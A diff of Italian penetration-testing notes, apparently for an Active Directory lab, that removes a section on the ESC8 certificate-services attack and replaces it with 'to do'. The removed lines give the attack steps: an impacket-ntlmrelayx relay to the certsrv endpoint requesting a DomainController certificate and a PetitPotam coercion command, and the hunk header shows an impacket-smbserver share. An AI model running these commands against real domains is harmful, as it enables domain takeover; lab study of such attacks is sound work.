@@ -201,14 +201,4 @@ impacket-smbserver -smb2support ATTACKERSHARE .
 continua quando possibile (part5)
 ### **ESC 8 - ADCS**
 
-Controlla sul seguente indirizzo se viene richiesto il login
-http://192.168.56.23/certsrv/certfnsh.asp
-
-Avvia un listener che reinderizzi il login smb a http
-```bash
-impacket-ntlmrelayx -t http://192.168.56.23/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
-```
-Usa petitpoam per ottenere il certificato dell'utente che runna il sito
-```bash
-python3 petitpotam.py 192.168.56.1 meereen.essos.local
-```
+Da fare
